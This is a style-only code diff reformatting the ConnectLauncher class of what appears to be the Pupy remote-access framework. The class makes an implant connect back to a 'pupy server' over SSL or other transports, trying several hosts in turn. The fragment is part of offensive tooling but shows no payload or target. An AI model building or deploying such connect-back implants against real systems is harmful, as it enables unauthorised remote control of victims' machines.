@@ -41,16 +41,20 @@ class ConnectLauncher(BaseLauncher):
     )
 
     def __init__(self, *args, **kwargs):
-        self.connect_on_bind_payload = kwargs.pop('connect_on_bind_payload', False)
+        self.connect_on_bind_payload = kwargs.pop(
+            'connect_on_bind_payload', False)
         super(ConnectLauncher, self).__init__(*args, **kwargs)
 
     @classmethod
     def init_argparse(cls):
-        cls.arg_parser = LauncherArgumentParser(prog="connect", description=cls.__doc__)
+        cls.arg_parser = LauncherArgumentParser(
+            prog="connect", description=cls.__doc__
+        )
         cls.arg_parser.add_argument(
-            '-c', '--host', metavar='<host:port>', required=True, action='append',
-            help='host:port of the pupy server to connect to. You can provide multiple '
-            '--host arguments to attempt to connect to multiple IPs'
+            '-c', '--host', metavar='<host:port>', required=True,
+            action='append', help='host:port of the pupy server to '
+            'connect to. You can provide multiple --host arguments '
+            'to attempt to connect to multiple IPs'
         )
         cls.arg_parser.add_argument(
             '-t', '--transport', choices=transports, default="ssl",
@@ -77,16 +81,18 @@ class ConnectLauncher(BaseLauncher):
             try:
                 yield self.connect_to_host(host_info)
                 self.reset_connection_info()
+
             except EOFError as e:
                 logger.info('Connection closed: %s', e)
 
             except Exception as e:
                 logger.exception(e)
 
-
     def connect_to_host(self, host_info):
-        logger.info('connecting to %s:%d using transport %s ...',
-            host_info.host, host_info.port, self.args.transport)
+        logger.info(
+            'connecting to %s:%d using transport %s ...',
+            host_info.host, host_info.port, self.args.transport
+        )
 
         info = create_client_transport_info_for_addr(
             self.args.transport, host_info,
